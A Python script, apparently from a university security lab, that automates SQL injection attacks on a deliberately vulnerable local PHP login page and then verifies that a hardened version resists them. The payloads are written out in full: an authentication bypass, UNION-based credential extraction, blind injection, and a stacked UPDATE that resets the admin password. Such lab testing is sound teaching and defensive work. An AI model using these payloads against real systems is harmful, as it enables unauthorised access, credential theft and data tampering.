import requests
import re
import html

BASE_URL = "http://localhost:8080/sns_lab5"
VULN_URL = f"{BASE_URL}/vulnerable_app/authentication.php"
SECURE_URL = f"{BASE_URL}/secure_app/authentication.php"
DB_INIT_URL = f"{BASE_URL}/db_init.php"

def reset_db():
    print("[*] Resetting database...")
    res = requests.get(DB_INIT_URL)
    if '✔' in res.text:
         print("[*] Database reset successful.")
    else:
         print("[-] Database reset failed!")

def test_login(app_url, username, password, description):
    print(f"\n--- Testing: {description} ---")
    print(f"Payload -> Username: {username} | Password: {password}")
    data = {'username': username, 'password': password}
    response = requests.post(app_url, data=data)
    
    success = "Login Successful!" in response.text
    print(f"Result: {'✅ SUCCESS (Logged in)' if success else '❌ FAILED (Denied)'}")
    
    # Check for rows returned
    if "Rows returned by query:" in response.text:
       matches = re.findall(r'<td>(.*?)</td>', response.text)
       if matches:
           print(f"   => Data rows found: {len(matches)//3} rows")
           # Print the first row's username
           print(f"   => First row extracted: {matches[0]} / {matches[1]}")
    return success

def check_admin_password(password):
    print(f"\n[*] Checking if admin password is '{password}' on vulnerable app...")
    data = {'username': 'admin', 'password': password}
    response = requests.post(VULN_URL, data=data)
    return "Login Successful!" in response.text

if __name__ == "__main__":
    print("="*50)
    print("  SNS LAB 5 AUTOMATED ATTACK TEST REPORT")
    print("="*50)
    reset_db()
    
    print("\n\n" + "="*50)
    print("  1. VULNERABLE APP TESTS")
    print("="*50)
    
    # 1. Normal Login
    test_login(VULN_URL, "user1", "pass1", "Normal Login")
    
    # 2. Authentication Bypass
    test_login(VULN_URL, "' OR '1'='1' -- ", "anything", "Authentication Bypass")
    
    # 3. Union-Based Injection
    test_login(VULN_URL, "' UNION SELECT id, username, password FROM users -- ", "anything", "UNION-Based Injection (Data Extraction)")
    
    # 4. Blind SQL Injection (True)
    test_login(VULN_URL, "admin' AND 1=1 -- ", "anything", "Blind SQL Injection (True logic)")
    
    # 5. Blind SQL Injection (False)
    test_login(VULN_URL, "admin' AND 1=2 -- ", "anything", "Blind SQL Injection (False logic)")
    
    # 6. Database Modification
    print("\n--- Testing: Database Modification Attack ---")
    print("[*] State BEFORE attack: Can we login with 'admin123'?")
    if check_admin_password("admin123"):
        print("    => YES, old password works.")
    else:
        print("    => NO, old password failed.")
        
    print("[*] Sending malicious UPDATE payload...")
    requests.post(VULN_URL, data={'username': "'; UPDATE users SET password='hacked' WHERE username='admin' -- ", 'password': '123'})
    
    print("[*] State AFTER attack: Can we login with 'admin123'?")
    if check_admin_password("admin123"):
        print("    => YES, password not changed (Attack Failed)")
    else:
        print("    => NO, password changed! (Attack Successful)")
        
    print("[*] State AFTER attack: Can we login with 'hacked'?")
    if check_admin_password("hacked"):
        print("    => ✅ YES, logging in with 'hacked' worked!")
    else:
        print("    => ❌ NO, logging in with 'hacked' failed.")


    print("\n\n" + "="*50)
    print("  2. SECURE APP TESTS (Verifying Defenses)")
    print("="*50)
    reset_db() # Reset the hacked admin password first!
    
    # 1. Normal Login
    test_login(SECURE_URL, "user1", "pass1", "Normal Login (Should succeed)")
    
    # 2. Authentication Bypass
    test_login(SECURE_URL, "' OR '1'='1' -- ", "anything", "Authentication Bypass (Should fail)")
    
    # 3. Union-Based Injection
    test_login(SECURE_URL, "' UNION SELECT id, username, password FROM users -- ", "anything", "UNION-Based Injection (Should fail)")
    
    # 4. Database Modification
    print("\n--- Testing: Database Modification Attack ---")
    print("[*] Sending malicious UPDATE payload to secure app...")
    requests.post(SECURE_URL, data={'username': "'; UPDATE users SET password='hacked' WHERE username='admin' -- ", 'password': '123'})
    
    print("[*] State AFTER attack: Can we login with 'hacked'?")
    data = {'username': 'admin', 'password': 'hacked'}
    if "Login Successful!" in requests.post(SECURE_URL, data=data).text:
        print("    => ❌ VULNERABLE! Password was changed.")
    else:
        print("    => ✅ SECURE! Password was NOT changed.")
        
    print("="*50)
    print("  TESTING COMPLETE")
    print("="*50)

